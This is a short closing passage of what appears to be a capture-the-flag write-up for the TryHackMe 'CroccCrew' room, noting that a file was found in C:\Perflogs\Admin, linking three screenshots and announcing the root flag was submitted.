It was found in the C:\Perflogs\Admin folder

![image.png](/assets/images/CroccCrew_THM/image%2030.png)

![image.png](/assets/images/CroccCrew_THM/image%2031.png)

Submitting our root.txt.

Rooted !

![image.png](/assets/images/CroccCrew_THM/image%2032.png)

Thanks for reading 😊
